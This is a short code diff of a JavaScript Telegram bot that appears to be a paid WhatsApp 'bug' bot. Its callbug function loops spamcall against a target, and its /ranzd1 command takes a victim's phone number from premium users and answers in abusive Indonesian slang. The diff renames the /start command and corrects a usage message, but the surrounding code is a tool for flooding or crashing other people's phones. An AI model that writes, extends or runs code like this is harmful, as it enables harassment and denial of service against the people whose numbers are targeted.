@@ -4644,7 +4644,7 @@ async function callbug(target) {
     await spamcall(target);
   }
 }
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/stjdjdjdjart/, (msg) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
@@ -4980,7 +4980,7 @@ bot.onText(/\/ranzd1(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /system 62×××.");
+        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /ranzd1 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
